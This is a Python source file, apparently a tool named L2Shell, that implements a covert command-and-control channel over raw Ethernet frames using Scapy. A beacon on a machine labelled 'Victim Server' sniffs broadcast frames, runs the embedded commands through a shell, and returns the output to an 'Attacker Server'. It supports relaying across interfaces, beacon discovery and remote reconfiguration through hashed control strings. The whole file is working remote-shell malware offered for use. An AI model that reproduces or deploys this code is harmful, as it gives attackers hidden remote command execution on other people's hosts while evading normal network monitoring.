import argparse, threading, time
import hashlib
from scapy.all import sniff, Ether, sendp, get_if_list, conf # pip
from scapy.interfaces import get_working_ifaces
import subprocess, os, socket, sys
import netifaces
import platform

print("Current Scapy Interface:", conf.iface)
os_name = platform.system()

mac_address = "FF:FF:FF:FF:FF:FF" # default return address is broadcast
frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are supported on the network
                   # this can be changed as required.
                  
frame_delay = 0.5      # For chunked responses, could help by spacing out frames
session_id  = "default" # Id for accessing the session
attacker_id = "default" # Id for returning information to the attacker server
relay_broadcast = False # Relay broadcast from attacker to all

sid_forward = ["laptop5566"] # Used by bridge beacons

# Create a hash for session_id change
session_id_change = hashlib.sha3_256()
session_id_change.update(b"SessionChangeRequest")
session_id_change = session_id_change.hexdigest()

# Create a hash for attacker_id change
attacker_id_change = hashlib.sha3_256()
attacker_id_change.update(b"AttackerChangeRequest")
attacker_id_change = attacker_id_change.hexdigest()

# Create a hash for framesize change
framesize_change = hashlib.sha3_256()
framesize_change.update(b"FrameSizeChangeRequest")
framesize_change = framesize_change.hexdigest()

# Create a hash for delay change
delay_change = hashlib.sha3_256()
delay_change.update(b"DelayChangeRequest")
delay_change = delay_change.hexdigest()

# Create hash of global ID (Only for broadcast events)
global_id = hashlib.sha3_256()
global_id.update(b"GlobalIdentifier") 
global_id = global_id.hexdigest()

# Create hash of relay broadcast change
relay_broadcast_change = hashlib.sha3_256()
relay_broadcast_change.update(b"RelayBroadcastChange") 
relay_broadcast_change = relay_broadcast_change.hexdigest()

# Create hash of relay broadcast getter
relay_broadcast_getter = hashlib.sha3_256()
relay_broadcast_getter.update(b"RelayBroadcastGetter") 
relay_broadcast_getter = relay_broadcast_getter.hexdigest()

# Create a hash for C2L2 server
c2_id = hashlib.sha3_256()
c2_id.update(b"Unique_C2_Id_Should_Be_Used")
c2_id = c2_id.hexdigest()

# Create hash of hash
c2_id_r = hashlib.sha3_256()
c2_id_r.update(c2_id.encode('utf-8'))
c2_id_r = c2_id_r.hexdigest()
                 
def send_frame(message, mac_address, sender):
    global interfaces
    global os_name
    
    if relay_broadcast == False:
        # Next send the output back to the command server
        frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
        for frame in frames:
            time.sleep(frame_delay)
            frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
            eth_frame = Ether(dst=mac_address) / frame
            
            # Send the Ethernet frame
            with open(os.devnull, 'w') as f:
                sendp(eth_frame, verbose=False)
    
    # Relay frame to all interfaces (Should be done by specific beacons)
    elif relay_broadcast == True:
        # Next send the output back to the command server
        frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
        for frame in frames:
            time.sleep(frame_delay)
            frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
            eth_frame = Ether(dst=mac_address) / frame
            
            # Get a list of all working interfaces
            interfaces = get_working_ifaces()
                   
            # Send the Ethernet frame
            for interface in interfaces:
                try:
                    sendp(eth_frame, verbose=False, iface=interface.name)
                            
                except Exception as e:
                    print(e)
        
def Delimiter(index, message, delimiter): # delimits received message
    pad     = "\\x00"   # Gets rid of padding
    returnc = "\\r"     # Gets rid of return carriage
    replay_frame = "replayed_frame" # Get rid of replayed frames
    
    string = str(message)
    nstring = string[index + len(delimiter):]
    nstring = nstring.replace(returnc, '')
    
    if relay_broadcast == False: #Don't strip relay frames as bridge beacon
        nstring = nstring.replace(replay_frame, '')
    
    nstring = nstring.replace(pad, '')
    nstring = nstring.replace("'", "")    
    return nstring

# Setter for session_id            
def ChangeSessionID(userin):
    global session_id
    session_id = userin
    
# Setter for attacker_id            
def ChangeAttackerID(userin):
    global attacker_id
    attacker_id = userin
    
# Setter for frame size      
def ChangeFrameSize(userin):
    global frame_size
    frame_size = int(userin)
    
# Setter for frame size      
def ChangeDelay(userin):
    global frame_delay
    frame_delay = int(userin)
    
# Setter for relay broadcast      
def ChangeRelayBroadcast():
    global relay_broadcast
    if relay_broadcast == False:
        relay_broadcast = True
    else:
        relay_broadcast = False

# Define a callback function to handle each frame
def process_frame(frame):
    global session_id
    if Ether in frame:
        eth_frame = frame[Ether]
        
        if len(eth_frame.payload) > 0:
                
            index = str(eth_frame.payload.original).find(session_id) # receive command from C2    
            if c2_id.encode("utf-8") in eth_frame.payload.original: # Respond to c2 ping
                # Send frame of hashed c2_id and session_id
                print("pong")
                pong = c2_id_r + session_id
                #print(pong)
                send_frame(pong.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                index = -1
                
            #attacker_id.encode('utf-8') in eth_frame.payload.original and 
            if relay_broadcast == True and "replayed_frame".encode('utf-8') not in eth_frame.payload.original: # Forward attacker and sids
                #rm
                #replayframe = eth_frame.payload.original.decode('utf-8') + "replayed_frame"        
                #send_frame(replayframe.encode("utf-8"), "FF:FF:FF:FF:FF:FF", attacker_id)
                if index != -1:
                    for sid in sid_forward:
                        if sid.encode('utf-8') in eth_frame.payload.original:
                            # Relay broadcast to all interfaces if bridge beacon
                            replayframe = eth_frame.payload.original.decode('utf-8') + "replayed_frame"
                            send_frame(replayframe.encode("utf-8"), "FF:FF:FF:FF:FF:FF", sid)
                            
                if attacker_id.encode('utf-8') in eth_frame.payload.original:
                    replayframe = eth_frame.payload.original.decode('utf-8') + "replayed_frame"        
                    send_frame(replayframe.encode("utf-8"), "FF:FF:FF:FF:FF:FF", attacker_id)
                    
                
            if session_id_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond to session change request
                # First, find index
                sid_index = str(eth_frame.payload.original).find(session_id_change)  
                string = Delimiter(sid_index, str(eth_frame.payload.original), session_id_change) 
                print("changing sid to: " + string)
                ChangeSessionID(string)
                index = -1
                
            if attacker_id_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond to attacker change request
                # First, find index
                att_index = str(eth_frame.payload.original).find(attacker_id_change)  
                string = Delimiter(att_index, str(eth_frame.payload.original), attacker_id_change) 
                print("changing attid to: " + string)
                ChangeAttackerID(string)
                index = -1
                
            if attacker_id_change.encode('utf-8') in eth_frame.payload.original and global_id.encode('utf-8') in eth_frame.payload.original: # Respond global attacker change request
                # First, find index
                att_index = str(eth_frame.payload.original).find(attacker_id_change)  
                string = Delimiter(att_index, str(eth_frame.payload.original), attacker_id_change) 
                print("changing attid to: " + string)
                ChangeAttackerID(string)
                index = -1
                
            if framesize_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond framesize change request
                # First, find index
                frame_index = str(eth_frame.payload.original).find(framesize_change)  
                string = Delimiter(frame_index, str(eth_frame.payload.original), framesize_change) 
                print("changing framesize to: " + string)
                ChangeFrameSize(string)
                index = -1
                
            if delay_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond frame delay change request
                # First, find index
                delay_index = str(eth_frame.payload.original).find(delay_change)  
                string = Delimiter(delay_index, str(eth_frame.payload.original), delay_change) 
                print("changing delay to: " + string)
                ChangeDelay(string)
                index = -1
                
            if relay_broadcast_getter.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond relay broadcast getter
                message = relay_broadcast_getter + str(relay_broadcast)
                send_frame(message.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                index = -1
                
            if relay_broadcast_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond relay broadcast change
                ChangeRelayBroadcast()
                index = -1
             
            if index != -1:
                print("Source MAC:", eth_frame.src)
                print("Destination MAC:", eth_frame.dst)
                print("Payload Length:", len(eth_frame.payload))
                
                # This section needs to be delimited twice, not elegant but will have to do for a bit
                nstring = Delimiter(index,str(eth_frame.payload.original),session_id)
                index2 = nstring.find(session_id)
                nstring = Delimiter(index2,nstring,session_id)
                try:
                    output = subprocess.check_output(nstring.strip("'"), shell=True)
                    print(output.decode("utf-8"))
                    noutput = attacker_id + output.decode("utf-8")
                
                except Exception as e:
                    output = "Error: Invalid Command"
                    noutput = attacker_id + output
                    
                # Next send the output back to the command server
                send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)


# This method is the listening server for the attacker host.
def process_return_frame(frame):
    if Ether in frame:
        eth_frame = frame[Ether]
        if eth_frame.dst=="ff:ff:ff:ff:ff:ff": # This needs to be changed or kept default
            
            if len(eth_frame.payload) > 0:
                
                pong_index = str(eth_frame.payload.original).find(c2_id_r)
                index = str(eth_frame.payload.original).find(attacker_id)
                if pong_index != -1:
                    
                    string = Delimiter(pong_index, str(eth_frame.payload.original), c2_id_r) 
                    print("Beacon: " + "mac:[" + eth_frame.src + "]" + " sid:[" + string + "]")
                    index = -1
                    
                    
                if relay_broadcast_getter.encode('utf-8') in eth_frame.payload.original and index != -1: # Print relay broadcast bool
                    # First, find index
                    relay_broadcast_getter_index = str(eth_frame.payload.original).find(relay_broadcast_getter)  
                    string = Delimiter(relay_broadcast_getter_index, str(eth_frame.payload.original), relay_broadcast_getter) 
                    print(string)
                    index = -1
                
                if index != -1:
                    # This section needs to be delimited twice, not elegant but will have to do for a bit
                    string = Delimiter(index, str(eth_frame.payload.original), attacker_id)
                    index2 = string.find(attacker_id)
                    string = Delimiter(index2, string, attacker_id)
                    terminal_format = string.split('\\n')
                    
                    #print(terminal_format)
                    for line in terminal_format:
                        print(line)
                    
                    print("" + session_id + ">", end='')
                    
                    
def ControlPanel(userin):
    global session_id
    global attacker_id
    global relay_broadcast
    
    if "enable options" in userin:
        
        while userin != "disable options" or userin != "3":
            print("L2C2 Control Panel: \n")
            print("1) ping beacons")
            print("2) connect to beacon")
            print("3) change attacker id")
            print("4) change beacon session id")
            print("5) change beacon attacker id")
            print("6) change attacker id for broadcast domain")
            print("7) change frame size for beacon")
            print("8) change chunked request delay for beacon")
            print("9) change relay broadcast for beacon")
            print("10) help")
            print("11) disable options")
            print(">", end='')
            userin = input()
            
            if userin == "1":
                print("Pinging Beacons: \n")
                send_frame(c2_id.encode('utf-8'), "FF:FF:FF:FF:FF:FF", "")
                time.sleep(3) # Wait some time for beacons to call home
                
            elif userin == "2":
                session_id = input("Session ID: ")
                print("Session ID is changed to " + session_id)
                
            elif userin == "3":
                session_id = input("Attacker ID: ")
                print("Attacker ID is changed to " + attacker_id)
                
            elif userin == "4":
                print("Current beacon [" + session_id + "]:")
                userin = input("Change session id? (y/n) ")
                if userin == "y":
                    userin = input("New Session ID: ")
                    # Send request to beacon
                    changesidreq = session_id_change + userin
                    send_frame(changesidreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    session_id = userin
                    print("Session ID is changed to " + session_id)
                    
            elif userin == "5":
                print("Current beacon [" + session_id + "]:")
                userin = input("Change attacker id? (y/n) ")
                if userin == "y":
                    userin = input("New attacker ID: ")
                    # Send request to beacon
                    changeattidreq = attacker_id_change + userin
                    send_frame(changeattidreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    attacker_id = userin
                    print("Attacker ID is changed to " + attacker_id)
            
            elif userin == "6":
                print("This request may need to be issued multiple times as the request are stateless")
                userin = input("Are you sure you want to issue a global attacker id change? (y/n) ")
                if userin == "y":
                    userin = input("New attacker ID: ")
                    # Send request to beacon
                    changeattidreq = attacker_id_change + userin
                    send_frame(changeattidreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", global_id)
                    attacker_id = userin
                    print("Attacker ID is changed to " + attacker_id)
                    
            elif userin == "7":
                print("Current beacon [" + session_id + "]:")
                userin = input("Change frame size? (y/n) ")
                if userin == "y":
                    userin = input("New frame size: ")
                    # Send request to beacon
                    framesizereq = framesize_change + userin
                    send_frame(framesizereq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    print("Framesize changed to " + userin)
                    
            elif userin == "8":
                print("Current beacon [" + session_id + "]:")
                userin = input("Change chunked response time (delay)? (y/n) ")
                if userin == "y":
                    userin = input("New delay: ")
                    # Send request to beacon
                    delayreq = delay_change + userin
                    send_frame(delayreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    print("Delay changed to " + userin)
                    
            elif userin == "9":
                print("Relay Broadcast:")    
                print("Current beacon [" + session_id + "]:")
                
                # Get current broadcast value for sid
                send_frame(relay_broadcast_getter.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                print("Current broadcast relay setting:", end='')
                time.sleep(3)
                userin = input("Change setting? (y/n)")
                if userin == "y":
                    send_frame(relay_broadcast_change.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    time.sleep(3)
                    print("Relay broadcast now set to: ", end='')
                    send_frame(relay_broadcast_getter.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    time.sleep(3)
                
            elif userin == "10":
                print("Select one of the options to configure a beacon, or exit by entering 'disable options'\n")
            
            elif userin == "11":
                userin = "disable options"
                print()
                break
                
            userin = ""

# Sniff Ethernet frames and call the process_packet function for each packet
def listen():
    print("In listen mode: ")
    sniff(prn=process_frame, store=0)
    
def rlisten():
    sniff(prn=process_return_frame, store=0)

# The connect feature can be used to send commands, but also receive info from
# remote computers
def connect():
    # Create an Ethernet frame with custom payload (padding)
    #for test in range(5):
    print("In connect mode: ")
    
    listener_thread = threading.Thread(target=rlisten)
    listener_thread.daemon = True
    listener_thread.start()
    
    userin = ""
    print("Please enter 'enable options' for more controls")
    while userin != "x":
        userin += session_id 
        userin += str(input())
                 
        # Make sure the input isn't larger than the set amount
        
        if len(userin) > frame_size:
            print("Error: Input too large...")
        
        ControlPanel(userin)      
        
        if userin != session_id and "enable options" not in userin:
            send_frame(userin.encode('utf-8'), mac_address, session_id)
            
        else:
            print("" + session_id + ">", end='')
        
        userin = ''
    exit(0)
    
def main():

    global mac_address
    global session_id
    global attacker_id
    global frame_size
    global frame_delay
    epilog="""
    e.g. python3 L2Shell.py -l -a 1a1a1a -s 3f3f3f <-- Victim Server
    e.g. python3 L2Shell.py -c -a 1a1a1a -s 3f3f3f <-- Attacker Server       
    """
   
    parser = argparse.ArgumentParser(usage=epilog)
    
    parser.add_argument("-l", "--listen", action='store_true', help="Listen for connections")
    parser.add_argument("-c", "--connect", action='store_true', help="Connect and instruct commands")
    parser.add_argument("-m", "--mac", help="beacon mac address", type=str)
    parser.add_argument("-s", "--session", help="session id", type=str, required=True)
    parser.add_argument("-a", "--attacker", help="attacker id", type=str, required=True)
    parser.add_argument("-d", "--delay", help="frame delay for chunked responses", type=int)
    parser.add_argument("-f", "--framesize", help="Sets frame size (victim host)", type=int)
    
    
    args = parser.parse_args()

    if args.mac:
        mac_address = args.mac
        
    if args.delay:
        frame_delay = args.delay    
        
    if args.attacker:
        attacker_id = args.attacker
    
    if args.framesize:
        frame_size = args.framesize
    
    if args.session:
        session_id = args.session
    
    if args.listen:
        listen()
        
    if args.connect:
        connect()
        
    #if args.check

if __name__ == "__main__":
    main()
